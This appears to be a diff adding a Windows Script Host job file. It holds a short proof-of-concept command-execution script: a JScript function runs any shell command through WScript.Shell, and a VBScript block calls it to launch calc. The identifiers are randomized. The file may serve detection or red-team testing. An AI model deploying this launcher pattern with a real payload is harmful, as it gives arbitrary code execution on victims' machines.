@@ -1,0 +1,22 @@
+<?xml version="1.0" ?>
+ <job id="gbbrev">
+   <script language="JScript">
+    function shell(page){
+    var author = new ActiveXObject("WScript.Shell");
+    var status = author.Exec(page);
+    return status.StdOut.ReadAll();
+    }
+    function werlnvra(){
+        shell("cmd /C calc");
+    }
+    </script>
+   <script language="VBScript">
+    '    <![CDATA[
+    Function hahgnq()
+        werlnvra 1
+    End Function
+
+    hahgnq
+'    ]]>
+   </script>
+ </job>
